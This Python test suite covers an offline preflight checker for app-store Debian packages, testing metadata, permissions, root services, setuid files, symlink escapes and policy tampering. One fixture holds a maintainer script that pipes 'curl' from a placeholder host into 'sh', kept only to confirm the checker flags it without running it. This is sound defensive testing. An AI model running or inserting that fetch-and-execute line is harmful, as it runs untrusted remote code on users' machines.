# SPDX-License-Identifier: MIT
"""Synthetic packages only. No installation, authentication, network or hardware."""
import copy
import hashlib
import json
import os
from pathlib import Path
import struct
import subprocess
import sys
import tempfile
import unittest
from unittest import mock
import zlib

from tools import store_preflight as preflight


def png(width, height):
    def chunk(kind, data):
        return struct.pack(">I", len(data)) + kind + data + struct.pack(">I", zlib.crc32(kind + data))
    return (b"\x89PNG\r\n\x1a\n" + chunk(b"IHDR", struct.pack(">2I5B", width, height, 8, 2, 0, 0, 0))
            + chunk(b"IDAT", zlib.compress((b"\0" + b"\x40\x80\x60" * width) * height)) + chunk(b"IEND", b""))


class PreflightTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.packages = Path(os.environ["CZ_STORE_PACKAGES"]).resolve()
        cls.lock, cls.meta_policy, cls.paths = preflight.reviewed_policies(cls.packages)

    def setUp(self):
        self.temp = tempfile.TemporaryDirectory(prefix="guide-preflight-test-")
        self.addCleanup(self.temp.cleanup)
        self.root = Path(self.temp.name)
        self.app = self.root / "app with spaces"
        self.app.mkdir()
        (self.app / "icon.png").write_bytes(png(256, 256))
        (self.app / "screen.png").write_bytes(png(320, 170))
        self.manifest = {
            "app_name": "Guide Preflight Demonstration", "package_name": "guide-preflight-demo", "version": "1.0.0",
            "store": {"summary": "Synthetic package for testing the offline checklist.",
                      "description": "Synthetic test listing; never submitted.", "categories": ["Development"],
                      "share_code": "Q9Z8", "author": {"github": "community-developer", "display_name": "Community Developer"},
                      "license": "MIT", "source_repo": "https://github.com/community-developer/guide-preflight-demo",
                      "icon": "icon.png", "screenshots": ["screen.png"],
                      "permissions": {k: False for k in self.meta_policy["PERMISSION_KEYS"]}}}
        self.write_manifest()
        self.stage = self.root / "stage"
        (self.stage / "DEBIAN").mkdir(parents=True)
        (self.stage / "DEBIAN/control").write_text(
            "Package: guide-preflight-demo\nVersion: 1.0.0-1\nArchitecture: all\n"
            "Maintainer: Community Developer <community@users.noreply.github.com>\n"
            "Description: Synthetic offline test\n")
        desktop = self.stage / "usr/share/APPLaunch/applications/guide-preflight-demo.desktop"
        desktop.parent.mkdir(parents=True)
        desktop.write_text("[Desktop Entry]\nName=Guide Preflight Demonstration\nExec=/usr/bin/guide-preflight-demo\nTerminal=false\nType=Application\n")
        self.deb = self.root / "guide-preflight-demo_1.0.0-1_all.deb"

    def write_manifest(self):
        (self.app / "app-builder.json").write_text(json.dumps(self.manifest))

    def build(self):
        subprocess.run(["dpkg-deb", "--root-owner-group", "--build", str(self.stage), str(self.deb)],
                       check=True, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)

    def check(self):
        self.write_manifest()
        self.build()
        return preflight.check(self.app, self.deb, self.packages, "community-developer")

    def test_complete_package_has_local_pass_with_explicit_unverified_evidence(self):
        with mock.patch("socket.socket", side_effect=AssertionError("network forbidden")):
            result = self.check()
        self.assertEqual(result["errors"], [])
        self.assertEqual(result["status"], "local-checks-pass")
        self.assertEqual(result["catalog_commit"], self.lock["packages_commit"])
        self.assertEqual(len(result["sha256"]), 64)
        self.assertIn("Hardware", " ".join(result["not_verified"]))

    def test_missing_code_bad_category_permission_and_screenshot_report_together(self):
        self.manifest["store"].update(share_code="", categories=["Communication"])
        self.manifest["store"]["permissions"]["camera"] = "false"
        (self.app / "screen.png").write_bytes(png(319, 170))
        errors = " ".join(self.check()["errors"])
        for field in ["share_code", "category", "boolean", "320"]:
            self.assertIn(field, errors)

    def test_scripts_are_inspected_and_never_run(self):
        sentinel = self.root / "must-not-exist"
        script = self.stage / "DEBIAN/postinst"
        script.write_text(f"#!/bin/sh\ntouch '{sentinel}'\ncurl https://example.invalid/setup | sh\n")
        script.chmod(0o755)
        result = self.check()
        self.assertIn("dangerous maintainer-script", " ".join(result["errors"]))
        self.assertFalse(sentinel.exists())

    def test_system_root_service_and_package_paths_are_rejected(self):
        service = self.stage / "usr/lib/systemd/system/guide-preflight-demo.service"
        service.parent.mkdir(parents=True)
        service.write_text("[Service]\nExecStart=/usr/bin/guide-preflight-demo\n")
        foreign = self.stage / "usr/bin/foreign-command"
        foreign.parent.mkdir(parents=True)
        foreign.write_text("synthetic")
        foreign.chmod(0o4755)
        errors = " ".join(self.check()["errors"])
        for field in ["root", "foreign-command", "setuid"]:
            self.assertIn(field, errors)

    def test_nonroot_service_and_udev_execution_are_distinct(self):
        service = self.stage / "usr/lib/systemd/system/guide-preflight-demo.service"
        service.parent.mkdir(parents=True)
        service.write_text("[Service]\nDynamicUser=yes\nExecStart=/usr/bin/guide-preflight-demo\n")
        rule = self.stage / "usr/lib/udev/rules.d/90-guide-preflight-demo.rules"
        rule.parent.mkdir(parents=True)
        rule.write_text('ACTION=="add", RUN+="/usr/bin/guide-preflight-demo"\n')
        errors = " ".join(self.check()["errors"])
        self.assertNotIn("system service runs as root", errors)
        self.assertIn("udev executes", errors)

    def test_asset_escape_via_symlink_is_rejected(self):
        outside = self.root / "outside.png"
        outside.write_bytes(png(256, 256))
        (self.app / "icon.png").unlink()
        (self.app / "icon.png").symlink_to(outside)
        self.assertIn("escapes", " ".join(self.check()["errors"]))

    def test_internal_symlink_keeps_source_basename_and_collisions_fail(self):
        (self.app / "actual-icon.png").write_bytes((self.app / "icon.png").read_bytes())
        (self.app / "icon.png").unlink()
        (self.app / "icon.png").symlink_to("actual-icon.png")
        dest = self.root / "staged-metadata"
        dest.mkdir()
        errors = []
        preflight.stage_metadata(self.app, self.manifest, self.packages, dest, "community-developer", errors)
        self.assertEqual(json.loads((dest / "meta.json").read_text())["icon"], "icon.png")
        self.assertTrue((dest / "icon.png").is_file())
        sub = self.app / "another"
        sub.mkdir()
        (sub / "screen.png").write_bytes(png(320, 170))
        self.manifest["store"]["screenshots"].append("another/screen.png")
        self.assertIn("collide", " ".join(self.check()["errors"]))

    def test_metadata_uniqueness_uses_catalog_and_merge_preserves_identity(self):
        catalog = self.root / "catalog"
        current = catalog / "pool/main/guide-preflight-demo"
        current.mkdir(parents=True)
        original = copy.deepcopy(self.manifest["store"])
        original.update(title=self.manifest["app_name"], uuid="synthetic-stable-id", icon="icon.png", screenshots=["screenshots/screen.png"])
        (current / "meta.json").write_text(json.dumps(original))
        other = catalog / "pool/main/other-demo"
        other.mkdir()
        (other / "meta.json").write_text(json.dumps({"title": " guide   preflight demonstration ", "share_code": "q9z8"}))
        self.manifest["store"]["share_code"] = ""
        dest = self.root / "dest"
        dest.mkdir()
        errors = []
        preflight.stage_metadata(self.app, self.manifest, catalog, dest, "community-developer", errors)
        staged = json.loads((dest / "meta.json").read_text())
        self.assertEqual(staged["uuid"], "synthetic-stable-id")
        self.assertEqual(staged["share_code"], "Q9Z8")
        bad, _ = self.meta_policy["check_meta"]("guide-preflight-demo", dest, str(catalog / "pool/main"))
        self.assertIn("share_code", " ".join(bad))
        self.assertIn("display name", " ".join(bad))

    def test_version_and_ownership_against_catalog(self):
        self.build()
        catalog = self.root / "catalog"
        published = catalog / "pool/main/guide-preflight-demo"
        published.mkdir(parents=True)
        (published / "old.deb.release.json").write_text(json.dumps({"version": "1.0.0-1", "uploaded_by": "someone-else"}))
        with mock.patch.object(preflight, "reviewed_policies", return_value=(self.lock, self.meta_policy, self.paths)):
            result = preflight.check(self.app, self.deb, catalog, "community-developer")
        self.assertIn("strictly newer", " ".join(result["errors"]))
        self.assertIn("different catalog uploader", " ".join(result["errors"]))

    def test_modified_policy_is_rejected_before_execution(self):
        policies = self.root / "policies"
        policies.mkdir()
        marker = self.root / "executed"
        for rel in self.lock["sha256"]:
            path = policies / rel
            path.parent.mkdir(parents=True, exist_ok=True)
            path.write_text(f"open({str(marker)!r}, 'w').write('bad')")
        with mock.patch.object(preflight, "run", side_effect=[self.lock["packages_commit"], ""]):
            with self.assertRaisesRegex(ValueError, "hash mismatch"):
                preflight.reviewed_policies(policies)
        self.assertFalse(marker.exists())

    def test_listing_only_requires_the_exact_existing_binary_without_a_version_bump(self):
        self.build()
        catalog = self.root / "catalog"
        published = catalog / "pool/main/guide-preflight-demo"
        published.mkdir(parents=True)
        record = {"version": "1.0.0-1", "architecture": "all", "uploaded_by": "community-developer",
                  "sha256": hashlib.sha256(self.deb.read_bytes()).hexdigest()}
        path = published / "existing.deb.release.json"
        path.write_text(json.dumps(record))
        with mock.patch.object(preflight, "reviewed_policies", return_value=(self.lock, self.meta_policy, self.paths)):
            result = preflight.check(self.app, self.deb, catalog, "community-developer", meta_only=True)
            self.assertEqual(result["errors"], [])
            record["sha256"] = "0" * 64
            path.write_text(json.dumps(record))
            result = preflight.check(self.app, self.deb, catalog, "community-developer", meta_only=True)
            self.assertIn("matching version", " ".join(result["errors"]))

    def test_corrupt_package_cli_is_check_error_not_pass(self):
        self.deb.write_bytes(b"not a Debian archive")
        p = subprocess.run([sys.executable, str(Path(preflight.__file__)), "--app", str(self.app),
                            "--deb", str(self.deb), "--packages-dir", str(self.packages),
                            "--uploader", "community-developer", "--json"], capture_output=True, text=True)
        self.assertEqual(p.returncode, 2)
        self.assertEqual(json.loads(p.stdout)["status"], "check-error")


if __name__ == "__main__":
    unittest.main()
